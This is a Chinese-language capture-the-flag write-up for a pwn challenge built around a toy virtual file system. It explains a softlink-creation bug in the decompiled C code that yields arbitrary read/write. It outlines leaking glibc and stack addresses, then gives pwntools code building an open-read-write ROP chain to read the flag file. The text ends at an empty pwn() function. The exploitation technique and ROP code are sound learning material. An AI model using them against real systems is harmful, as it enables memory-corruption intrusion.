程序实现了一个简单的vfs（虚拟文件）系统，主要功能如下：
```
Commands:
  LIST         列出文件
  READ <name> <len>      读取文件
  WRITE <name> <len>  (then send raw bytes)     写入文件
  TOUCH <name>     创建文件
  HARDLINK <src> <dst>      创建硬链接
  SOFTLINK <src> <dst>       创建软连接
  QUIT          退出
```

**硬链接：多个文件名，指向同一个 inode**
	这里实现时，直接将文件内容进行了copy
**软连接：一个单独的特殊文件，里面存的是“目标文件的路径”**

现在回到`menu_loop(fd, file, memo, &vfs);`被调用时的函数：

# vuln

看一下软链接的创建逻辑：
```c
void __fastcall cmd_softlink(int fd, fi *file, const char *src, const char *dst)
{
  __int64 con; // [rsp+20h] [rbp-20h]
  fi *f_inode; // [rsp+28h] [rbp-18h]
  fi *inode; // [rsp+30h] [rbp-10h]
  int free_inode_idx; // [rsp+38h] [rbp-8h]
  int inode_idx; // [rsp+3Ch] [rbp-4h]

  inode_idx = find_inode(file, src);
  if ( inode_idx >= 0 )
  {
    if ( (int)find_inode(file, dst) < 0 )
    {
      free_inode_idx = find_free_inode(file);
      if ( free_inode_idx >= 0 )
      {
        inode = &file[inode_idx];
        if ( inode->type == 2 )
        {
          send_text(fd, "ERR softlink source type not allowed\n");
        }
        else if ( inode->len > 23 && inode->con )
        {
          con = (__int64)inode->con;
          if ( !memcmp((const void *)(con + 0x10), "LNKPTR", 6u) )
          {
            f_inode = &file[free_inode_idx];
            memset(f_inode, 0, sizeof(fi));
            copy_name(f_inode, dst);
            f_inode->flag = 1;
            f_inode->type = 2;
            f_inode->len = *(_DWORD *)(con + 8);
            f_inode->con = *(char **)con;
            if ( inode->type != 1 )
              f_inode->perm = *(_DWORD *)(con + 12);
            send_text(fd, "OK\n");
          }
          else
          {
            send_text(fd, "ERR source is not a softlink blob\n");
          }
        }
        else
        {
          send_text(fd, "ERR source is not linkable\n");
        }
      }
      else
      {
        send_text(fd, "ERR inode full\n");
      }
    }
    else
    {
      send_text(fd, "ERR file exists\n");
    }
  }
  else
  {
    send_text(fd, "ERR no such source\n");
  }
}
```

可以看到，这里在写`len`、`con`时，解引用和偏移都写错了，可以直接通过伪造一个文件的`con`，再创建它的软连接，进行任意地址读写。

# 思路

由于限制了文件个数，给的读写数量最多6次，不过可以通过修改结构体进行任意次数的读写（其实没必要，用不了那么多次）。

没开pie，通过读got表泄露glibc，通过glibc的environ泄露栈地址，最后在栈上打orw。

```python
def must_find(rop, gadgets):
    g = rop.find_gadget(gadgets)
    if g is None:
        raise RuntimeError(f"can't find gadget: {gadgets}")
    return g.address


def build_orw(libc, flag_addr, buf_addr, ret, fd=3):
    rop = ROP(libc)

    pop_rax = must_find(rop, ["pop rax", "ret"])
    pop_rdi = must_find(rop, ["pop rdi", "ret"])
    pop_rdx = must_find(rop, ["pop rdx", "leave", "ret"])
    pop_rsi = must_find(rop, ["pop rsi", "ret"])
    syscall = next(libc.search(asm("syscall; ret")))

    chain = flat(
        ret + 8 * 8,
        # open("./flag", 0, 0)
        pop_rax,  # ret
        2,
        pop_rdi,
        flag_addr,
        pop_rsi,
        0,
        pop_rdx,
        0,
        ret + 8 * 18,  # ret+8*8
        syscall,
        # read(fd, buf, 0x100)
        pop_rax,
        0,
        pop_rdi,
        fd,
        pop_rsi,
        buf_addr,
        pop_rdx,
        0x100,
        ret + 8 * 28,  # ret+8*18
        syscall,
        # write(1, buf, 0x100)
        pop_rax,
        1,
        pop_rdi,
        1,
        pop_rsi,
        buf_addr,
        pop_rdx,
        0x100,
        0,  # 8 * 28
        syscall,
    )
    return chain


def pwn():
```
